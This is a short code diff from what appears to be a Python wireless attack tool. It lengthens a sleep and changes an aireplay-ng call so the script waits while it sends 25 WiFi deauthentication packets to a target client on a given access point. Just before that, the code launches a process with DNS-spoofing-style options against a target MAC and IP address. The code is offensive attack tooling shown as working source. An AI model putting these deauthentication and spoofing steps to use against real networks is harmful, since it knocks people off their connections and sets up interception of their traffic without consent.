@@ -451,12 +451,15 @@ if __name__ == "__main__":
                            listen_network_interface + ' -t ' + target_mac_address + ' -T ' + target_ip_address +
                            ' --dnsop --exit --quiet &'],
                           shell=True)
-                sleep(3)
+                sleep(5)
 
                 # Send wifi deauth packets
                 Base.print_info("WiFi deauth packets is sending ...")
-                sub.Popen(['aireplay-ng wlan1 -0 25 -a ' + bssid + ' -c ' + target_mac_address +
-                           ' >/dev/null 2>&1'], shell=True)
+
+                aireplay_process = sub.Popen(['aireplay-ng wlan1 -0 25 -a ' + bssid + ' -c ' + target_mac_address +
+                                              ' >/dev/null 2>&1'], shell=True)
+                aireplay_process.wait()
+
                 Base.print_info("All WiFi deauth packets sent")
 
             except OSError as e:
